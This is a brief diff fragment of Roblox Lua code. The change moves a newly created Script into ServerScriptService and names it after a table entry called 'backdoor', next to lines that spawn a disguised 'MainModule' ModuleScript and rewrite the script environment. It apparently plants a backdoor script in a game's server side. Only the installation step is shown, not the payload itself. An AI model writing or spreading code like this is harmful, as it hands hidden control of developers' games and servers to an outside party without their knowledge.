@@ -11,5 +11,5 @@ local storage = plr.Character or plr:FindFirstChildOfClass("PlayerGui") or nil
 getfenv().script = Instance.new("ModuleScript", storage)
 getfenv().script.Name = "MainModule"..SUFFIX
 
-local script = Instance.new("Script", nil)
+script = Instance.new("Script", game:GetService("ServerScriptService"))
 script.Name = system32["backdoor"].Name..SUFFIX
